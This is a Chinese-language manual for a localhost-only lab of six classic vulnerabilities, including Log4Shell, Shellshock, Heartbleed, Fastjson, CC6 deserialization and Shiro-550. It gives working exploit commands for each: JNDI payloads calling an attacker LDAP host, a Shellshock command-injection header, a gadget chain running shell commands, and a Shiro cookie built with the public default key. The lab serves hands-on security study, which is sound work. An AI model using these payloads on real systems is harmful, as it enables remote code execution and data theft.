# OffSec 经典漏洞本地实验室 — 操作手册

三个真实（非模拟）漏洞环境，全部跑在专用 WSL2 发行版 `OffsecLab` 里，
数据全部在 `D:\WSL\offsec-lab`（不占用 C 盘）。所有容器只监听
`127.0.0.1`，不对外网暴露。

## 前置：进入实验环境

```bash
wsl -d OffsecLab -u root
```

之后所有命令都在这个 shell 里执行（下面命令省略了 `wsl -d OffsecLab -u root -- ` 前缀，
如果要从 Windows 侧一次性执行，把命令拼到这个前缀后面即可，注意路径参数前加
`MSYS_NO_PATHCONV=1` 避免 Git Bash 把 `/root/...` 误转换成 Windows 路径）。

---

## 1. Log4Shell (CVE-2021-44228)

**代码位置**：`/root/labs/log4shell/`（Windows 侧 `D:\wsl-lab-src\log4shell\`）

```bash
cd /root/labs/log4shell
docker compose up -d          # 启动 attacker + victim 两个容器
bash exploit.sh                # 发起真实攻击并显示 RCE 证据
```

手动复现攻击（不用脚本）：

```bash
curl -H 'User-Agent: ${jndi:ldap://attacker:1389/a}' http://localhost:18080/
docker logs log4shell-attacker   # 看 LDAP 命中 + RCE 回调证据
```

关闭：`docker compose -f /root/labs/log4shell/docker-compose.yml down`

---

## 2. Shellshock (CVE-2014-6271)

**代码位置**：`/root/labs/shellshock/`

```bash
docker run -d --name shellshock-victim -p 18081:80 shellshock-lab
```

攻击：

```bash
curl -s -A '() { :;}; echo "Content-Type: text/plain"; echo; echo PWNED; export PATH=/usr/bin:/bin; id' \
  http://localhost:18081/cgi-bin/status.cgi
```

（Apache 的 CGI 处理要求响应第一行必须是合法 HTTP 头，所以 payload 里先自己
造一个 `Content-Type` 头再输出命令结果——这也是 Shellshock 打 CGI 时的标准手法。）

关闭：`docker rm -f shellshock-victim`

---

## 3. Heartbleed (CVE-2014-0160)

**代码位置**：`/root/labs/heartbleed/`

```bash
docker run -d --name heartbleed-victim -p 18443:4433 heartbleed-lab
```

检测（nmap 标准手法）：

```bash
nmap -p 18443 --script ssl-heartbleed localhost
```

真正把内存 dump 出来（nmap 的脚本只判断有无漏洞，不显示泄露内容）：

```bash
python3 /root/labs/heartbleed/heartbleed_poc.py 127.0.0.1 18443
```

关闭：`docker rm -f heartbleed-victim`

---

## 4. Fastjson AutoType RCE

**代码位置**：`/root/labs/deser-classics/`（attacker 容器直接复用 Log4Shell 的 rogue LDAP，因为
Fastjson 经典利用手法走的也是 JNDI）

```bash
cd /root/labs/deser-classics
docker compose up -d
```

攻击：

```bash
curl -X POST -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/a","autoCommit":true}' \
  http://localhost:18090/
docker logs deser-attacker   # 看 LDAP 命中 + RCE 回调证据
```

---

## 5. Apache Commons Collections (CC6 gadget chain)

**代码位置**：`/root/labs/deser-classics/cc-gadget/`（payload 生成器）+ `cc-victim/`（网络监听端）

这个没有走 ysoserial 现成工具，而是手写了完整的 CC6 利用链（`GenCC6.java`）——
先用无害的 transformer 完成构造期的 hashCode 触发，再反射替换成真正的
`Runtime.exec` 链，避免生成 payload 的机器自己先中招。选 CC6 而不是更"著名"的
CC1，是因为 CC1 依赖的 JDK 内部类在 8u71 之后被官方修复关闭了，这个实验室统一
用的 JDK 8u181，CC1 在这个版本上根本打不通。

```bash
cd /root/labs/deser-classics/cc-gadget
java -cp .:commons-collections-3.2.1.jar GenCC6 'id; hostname' payload.bin   # 生成 payload
python3 send_payload.py 127.0.0.1 17070 payload.bin                          # 发给靶机
docker exec cc-victim cat /tmp/cc6-proof.txt   # 如果 payload 里带了写文件的命令
```

---

## 6. Apache Shiro-550 (CVE-2016-4437)

**代码位置**：`/root/labs/deser-classics/shiro-victim/` + 复用上面 CC6 的 payload 生成器

Shiro 的 `rememberMe` Cookie 本质是"AES 加密的序列化对象"——密钥是 Shiro 早期版本
写死在框架里、后来被公开的那把默认密钥。所以整个攻击链就是：用 CC6 生成器造好
gadget chain payload，再用 Shiro 那把默认密钥做 AES-CBC 加密，塞进 Cookie 发出去。

一条脚本跑完全流程（生成 payload → 加密 → 发送 → 验证）：

```bash
bash /root/labs/deser-classics/cc-gadget/send_shiro_cookie.sh
```

手动复现：

```bash
D=/root/labs/deser-classics/cc-gadget
java -cp $D:$D/commons-collections-3.2.1.jar GenCC6 'id > /tmp/x.txt' $D/shiro-payload.bin
java -cp $D EncryptForShiro $D/shiro-payload.bin > $D/cookie.txt
curl -s -H "Cookie: rememberMe=$(cat $D/cookie.txt)" http://localhost:18100/
```

---

## 全部清理

```bash
docker rm -f log4shell-victim log4shell-attacker shellshock-victim heartbleed-victim \
  fastjson-victim cc-victim shiro-victim deser-attacker
docker rmi log4shell-victim log4shell-attacker shellshock-lab heartbleed-lab \
  deser-classics-fastjson-victim deser-classics-cc-victim deser-classics-shiro-victim
```

## 彻底删除整个实验室（连 WSL 发行版一起删）

在 **Windows PowerShell**（不是 WSL 内部）执行：

```powershell
wsl --unregister OffsecLab
Remove-Item -Recurse -Force D:\WSL\offsec-lab
```

## 备注

- `C:\Users\<you>\.wslconfig` 里加了一行 `vmIdleTimeout=604800000`（7 天），
  防止 WSL 空闲自动关机打断实验室里跑着的容器。如果不再需要，可以删掉这个文件
  或改回默认值。
- 所有环境仅监听 localhost，不建议改成对外监听——这些都是故意留后门级别的
  漏洞版本，只应该在隔离环境里用于学习。
